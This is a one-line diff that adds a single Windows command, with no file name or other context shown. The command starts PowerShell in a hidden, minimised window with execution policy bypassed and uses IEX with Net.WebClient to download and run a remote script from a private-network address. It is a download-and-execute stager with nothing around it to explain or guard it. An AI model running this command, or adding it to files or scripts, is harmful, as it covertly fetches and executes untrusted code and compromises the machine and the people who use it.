@@ -1,0 +1,1 @@
+cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.150.2:8080/win11_FTok_v1.ps1')"
